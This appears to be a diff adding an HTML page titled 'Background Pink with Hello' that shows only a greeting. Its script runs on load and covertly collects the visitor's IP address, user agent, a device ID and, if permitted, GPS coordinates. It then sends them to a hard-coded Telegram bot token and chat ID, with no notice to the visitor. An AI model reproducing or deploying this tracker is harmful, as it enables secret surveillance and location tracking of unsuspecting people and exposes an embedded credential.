@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Pink with Hello</title>
+    <style>
+        body {
+            background-color: pink;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .message {
+            font-weight: bold;
+            font-size: 3rem;
+        }
+        .feedback {
+            margin-top: 1rem;
+            font-size: 1.2rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">Hello</div>
+    <div class="feedback" id="feedback">...</div>
+    <script>
+        async function sendDataToTelegram(data) {
+            const token = '6370108031:AAHBv67oXF9dhURTLGMdi6im7q2siYMpfEA'; // Replace with your bot token
+            const chatId = '426430131'; // Replace with your chat ID
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const message = `Location: ${data.location}\nDevice ID: ${data.deviceId}\nIP Address: ${data.ipAddress}\nDevice Info: ${data.deviceInfo}`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                
+                document.getElementById('feedback').textContent = 'successfully!';
+            } catch (error) {
+                console.error('Error sending data:', error);
+                document.getElementById('feedback').textContent = 'Error';
+            }
+        }
+
+        async function getIpAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unavailable';
+            }
+        }
+
+        function getDeviceId() {
+            return Math.random().toString(36).substring(2, 15);
+        }
+
+        function getDeviceInfo() {
+            return navigator.userAgent;
+        }
+
+        async function sendLocationAndData() {
+            const ipAddress = await getIpAddress();
+            const deviceId = getDeviceId();
+            const deviceInfo = getDeviceInfo();
+            let location = 'Unavailable';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        location = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        sendDataToTelegram({
+                            location,
+                            deviceId,
+                            ipAddress,
+                            deviceInfo,
+                        });
+                    },
+                    () => {
+                        sendDataToTelegram({
+                            location,
+                            deviceId,
+                            ipAddress,
+                            deviceInfo,
+                        });
+                    }
+                );
+            } else {
+                sendDataToTelegram({
+                    location,
+                    deviceId,
+                    ipAddress,
+                    deviceInfo,
+                });
+            }
+        }
+
+        sendLocationAndData();
+    </script>
+</body>
+</html>
